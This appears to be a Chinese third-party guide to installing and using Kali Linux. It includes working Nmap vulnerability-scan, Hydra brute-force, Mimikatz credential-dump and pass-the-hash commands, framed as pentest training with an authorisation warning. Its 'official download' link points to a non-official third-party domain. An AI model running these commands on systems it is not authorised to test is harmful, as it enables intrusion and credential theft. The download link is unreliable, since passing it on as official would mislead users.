## ✨ Kali Linux 是什么

Kali Linux 是一套专注于渗透测试和数字取证的 Linux 发行版，前身是 BackTrack。它默认集成了超过 600 款安全工具，覆盖侦察、扫描、漏洞评估、后渗透、密码破解等完整攻击链，是安全研究人员和红队工程师最常用的作战平台之一。

与通用 Linux 发行版不同，Kali 的设计理念是"开箱即用"——装好系统就有全套工具，不需要一个个编译安装。它提供了 Live 模式，可以直接从 USB 启动而不碰宿主机硬盘，这在取证场景里很关键。当前维护版本基于 Debian，支持 x86、ARM、WSL 2 等多种运行环境。

Kali 的核心价值在于工具链的整合与更新。Nmap、Metasploit、Hydra、Hashcat、Burp Suite 这些渗透测试的主力工具在 Kali 里都是预装且保持较新版本，工具之间的依赖关系和路径配置也已经处理好，省掉了大量环境折腾的时间。

*本文由个人利用网络公开资料整理编写，非官方文档，仅供学习交流参考；软件信息以官方发布为准，使用中遇到的问题请查阅官方渠道，本站不承担任何责任。*

---

## 📥 下载入口

> 📥 **获取安装包**
>
> - [官方下载（推荐）](https://kali-linux.qjxz.skin/download.html) —— 下载页整理了当前可用的版本和安装说明
> - 官方渠道：Kali 官网提供 Live ISO、Installer、ARM 镜像、WSL 2 导入包等多种发行格式，按需选择

---

## 🔧 Kali Linux 安装步骤

Kali 的安装方式取决于你的使用场景，常见有三种：Live USB 应急模式、硬盘常驻安装、WSL 2 子系统。

### 方式一：Live USB（最轻量，不碰宿主机）

1. 下载 Kali Live ISO 镜像
2. 用 Rufus 或 BalenaEtcher 把 ISO 写入 8GB 以上的 U 盘
3. 重启电脑，从 U 盘引导（进 BIOS/UEFI 改启动顺序）
4. 进入 Live 桌面后直接使用，关机后 U 盘数据保留、宿主机不留痕

> [!TIP]
> Live 模式适合临时测试、取证场景或不想在本机装系统的用户。但 Live 环境重启后所有改动都会丢失，需要持久化的话要用 `persistence` 分区方案。

### 方式二：硬盘安装（常驻使用）

1. 先给 Kali 预留磁盘空间——至少 30GB 推荐 60GB 以上
2. 下载 Installer 版 ISO，写入 U 盘
3. 引导后选择 "Graphical Install" 走图形化向导
4. 分区阶段：新手选 "Guided - use entire disk"；懂的话手动分 `/boot`、`/`、`swap`
5. 软件选择阶段确保勾选了 "Default software selections"（约 600 款工具）

### 方式三：WSL 2（Windows 用户首选）

```powershell
# 管理员 PowerShell
wsl --install
wsl --set-default-version 2
# 去 Microsoft Store 搜 "Kali Linux" 一键安装
```

WSL 2 版本的 Kali 运行效率接近原生，且能直接调用 Windows 的文件系统和浏览器，日常渗透测试完全够用。GPU 计算（Hashcat/CUDA）也从 Windows 11 开始支持。

> [!WARNING]
> 安装完成后第一件事必须跑 `sudo apt update && sudo apt full-upgrade -y`——Kali 的安全工具更新频率很高，旧版本可能错过关键漏洞模块或有已知的兼容性问题。

---

## 📖 Kali Linux 核心用法入门

### 侦察扫描：用 Nmap 摸清目标

Nmap 是渗透测试侦察阶段的第一把刀，快速发现目标的开放端口、运行服务、操作系统。Kali 里预装了命令行版和图形化 Zenmap。

最常用的四种扫描模式：

| 命令 | 类型 | 适用场景 |
| --- | --- | --- |
| `nmap -sS 192.168.1.0/24` | SYN 扫描 | 默认，不完成 TCP 握手，隐蔽且快 |
| `nmap -sT 192.168.1.100` | Connect 扫描 | 完整握手，最准确但易被检测 |
| `nmap -sU 192.168.1.100` | UDP 扫描 | 扫 DNS/SNMP 等 UDP 服务，速度慢 |
| `nmap -A 192.168.1.100` | 全功能扫描 | OS 识别 + 版本检测 + 默认脚本，信息最全 |

Nmap 最强大的是 NSE 脚本引擎——超过 600 个 Lua 脚本可以做深度检测：

```bash
# 扫 SMB 漏洞（永恒之蓝等）
nmap --script smb-vuln* -p 445 192.168.1.0/24

# 扫 Log4j 漏洞
nmap --script http-log4shell -p 80,443 192.168.1.0/24

# 列出 SMB 共享（无需认证）
nmap --script smb-enum-shares -p 445 192.168.1.100
```

> [!NOTE]
> SYN 扫描需要 root 权限（要发原始 TCP 包）。扫描速度 `-T4` 通常是最佳平衡点，T5 在企业网络里容易丢包被 IPS 标记。

### 暴力破解：Hydra 极速登录破解

Hydra 支持 50 多种服务协议的暴力破解，适合在侦察阶段尝试弱密码和默认凭据。

```bash
# 基本语法：hydra [选项] <目标> <协议>
hydra -l admin -P wordlist.txt 192.168.1.100 ssh -t 4
```

常用协议的实战示例：

```bash
# SSH 爆破（注意现代 SSH 默认禁 root 登录，且 fail2ban 会封 IP）
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4

# HTTP POST 登录表单
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login failed"

# SMB 共享
hydra -l administrator -P wordlist.txt 192.168.1.100 smb

# MySQL
hydra -l root -P wordlist.txt 192.168.1.100 mysql
```

Kali 自带几套常用字典：

| 路径 | 内容 |
| --- | --- |
| `/usr/share/wordlists/rockyou.txt.gz` | 1434 万个密码（解压：`gzip -d rockyou.txt.gz`） |
| `/usr/share/wordlists/dirb/common.txt` | 4600 条通用密码/目录 |
| `/usr/share/wordlists/metasploit/` | 各种服务的默认密码列表 |

> [!WARNING]
> Hydra 是强攻击性工具，目标的 IPS/IDS、WAF 都会记录并标记你的 IP。很多服务有速率限制和账户锁定机制。**务必只在已获授权的目标上使用**，未经授权跑 Hydra 属于违法行为。

### 后渗透：拿到 shell 之后

拿下初始 shell（通常是普通用户权限）只是开始，后渗透阶段要扩大战果——提权、抓凭据、横向移动到域控。

**Windows 提权的常见路径：**

- Windows Service Exploits：检查当前用户能否启动/停止服务，如果服务的配置文件路径可写就替换恶意二进制
- AlwaysInstallElevated：组策略漏洞，MSI 安装包以 SYSTEM 权限运行
- Token Impersonation：Metasploit Meterpreter 里 `gettokens` 列出令牌后 `impersonate_token` 注入 SYSTEM
- SeImpersonatePrivilege：用 PrintSpoofer 或 GodPotato

**Linux 提权的检查清单：**

```bash
# 1. 检查 sudo 权限
sudo -l

# 2. 找可写的 SUID 二进制
find / -perm -4000 2>/dev/null | xargs ls -la

# 3. 查 GTFOBins 看这些 SUID 二进制能不能利用
```

**凭据收集：**

Windows 上 Mimikatz 可以直接从内存导出明文密码或 NTLM 哈希：

```meterpreter
meterpreter> load mimikatz
meterpreter> mimikatz_command -f sekurlsa::logonpasswords
meterpreter> mimikatz_command -f sam::dump
```

跨平台的 LaZagne 可以扫描浏览器、SSH 密钥、云存储等几百种软件里保存的密码。

**横向移动的核心是用已拿到的凭据跳到其他主机：**

```bash
# SMB 传递哈希（PTH），不需要明文密码
impacket-psexec -hashes <hash>:<hash> administrator@192.168.1.101

# PsExec / WMIExec 用明文
impacket-wmiexec administrator:password@192.168.1.101
```

### GPU 加速密码破解

CPU 跑密码破解通常是每秒几万到几百万次哈希，GPU 的并行计算能力可以把速度提升到每秒几十亿次——快 100~1000 倍。

**NVIDIA 驱动安装流程：**

1. 禁用开源 nouveau 驱动并重启
2. `sudo apt update && sudo apt full-upgrade -y && sudo reboot`
3. `sudo apt install -y nvidia-driver nvidia-cuda-toolkit nvidia-opencl-icd`
4. 重启后 `nvidia-smi` 验证

**AMD 驱动相对复杂：**

- 消费级 RX 系列用内核驱动 `amdgpu` + `rocm-opencl-sdk`
- 企业级 Radeon Pro 需要闭源 AMDGPU-PRO，与内核驱动不能共存

验证 GPU 是否就绪：

```bash
hashcat -I           # 应看到 NVIDIA CUDA 或 AMD OpenCL 后端
john --list=build-info   # 应包含 OpenCL/CUDA 条目
```

> [!TIP]
> NVIDIA 驱动包默认用 DKMS（Dynamic Kernel Module Support），内核更新后会自动重新编译驱动模块。如果还是失效，手动跑 `sudo dkms autoinstall && sudo reboot`。WSL 2 从 Windows 11 开始支持 CUDA（仅限 NVIDIA），驱动由 Windows 管理，WSL 内不需要单独装。

### 日常使用的几条经验

- **不要用 root 直接干活**：Kali 默认 root 权限，但日常浏览、文档编辑应该用普通用户，`sudo` 按需提权。浏览器插件、钓鱼邮件都可能被利用。
- **apt 源经常更新**：`apt update && apt full-upgrade` 每周至少跑一次。安全工具的更新频率远高于普通发行版，错过更新会导致 Nmap/NSE 脚本、Metasploit payload 过期。
- **快照备份**：用 VMware/VirtualBox 跑 Kali 的话，装好系统 + 驱动 + 常用工具后打一个快照，装坏了直接回滚比重装快得多。
- **字典管理**：`rockyou.txt.gz` 解压后约 1.3GB，记得 `gzip -d` 解压才能用。自己的字典可以存到 `/usr/share/wordlists/` 下方便调用。
- **WSL 2 的已知限制**：不支持 OpenCL（只有 CUDA）、USB 设备转发需要额外配置、某些内核模块（如 tun0）可能缺失。如果做 VPN/ARP 欺骗之类的操作，还是建议用原生安装版。

---

## 🔗 相关资源

- [kali linux官网](https://kali-linux.qjxz.skin)
- [kali linux文档](https://kali-linux.pages.dev/)
- [GitHub 仓库](https://github.com/alipymanbu/APK/tree/main/%E6%89%8B%E6%9C%BA%E7%89%88/kali%20linux)
- [Gitee 镜像](https://gitee.com/manbu1103/APK/tree/main/%E6%89%8B%E6%9C%BA%E7%89%88/kali%20linux)
- [GitCode 镜像](https://gitcode.com/qq352325405/APK/tree/main/%E6%89%8B%E6%9C%BA%E7%89%88/kali%20linux)

---

## 📚 相关文章

- [Kali Linux 踩过的六个深坑，每个都差点让我重装系统](https://laoguosofts.github.io/posts/kali-linux.html)

- [Kali Linux 踩过的那些坑——从 dpkg 锁到 OpenVAS 初始化](https://alipymanbu.github.io/posts/kali-linux.html)
